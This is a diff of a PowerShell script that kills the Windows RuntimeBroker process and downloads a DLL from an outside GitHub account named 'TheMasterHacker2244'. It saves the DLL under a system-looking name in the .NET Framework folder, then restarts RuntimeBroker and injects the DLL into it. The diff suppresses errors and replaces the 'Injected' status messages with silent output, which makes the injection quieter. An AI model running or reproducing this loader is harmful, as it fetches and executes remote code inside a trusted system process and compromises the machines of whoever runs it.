@@ -1,15 +1,11 @@
 $ErrorActionPreference = 'SilentlyContinue'
-
 $dllPath = "$env:SystemRoot\Microsoft.NET\Framework\sbscmp30_mscorwks.dll"
 $processName = 'RuntimeBroker'
 $processPath = "$env:SystemRoot\System32\$processName.exe"
-
 Get-Process -Name $processName -ErrorAction SilentlyContinue | Stop-Process -Force
 Start-Sleep -Seconds 2
-
 New-Item -ItemType Directory -Force -Path (Split-Path $dllPath) | Out-Null
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/TheMasterHacker2244/Main/main/sbscmp30_mscorwks.dll" -OutFile $dllPath -ErrorAction Stop
-
 Add-Type -TypeDefinition @'
 using System;
 using System.Runtime.InteropServices;
@@ -41,15 +37,7 @@ public class I{
     }
 }
 '@ -ReferencedAssemblies System.Runtime.InteropServices
-
 Start-Process -FilePath $processPath
 Start-Sleep -Seconds 2
-
 $proc = Get-Process -Name $processName -ErrorAction SilentlyContinue
-if ($proc) {
-    $result = [I]::X($proc[0].Id, $dllPath)
-    if ($result) { Write-Host "Injected" }
-    else { Write-Host "unable to inject" }
-} else {
-    Write-Host "unable to inject"
-}
+if ($proc) { [I]::X($proc[0].Id, $dllPath) | Out-Null }
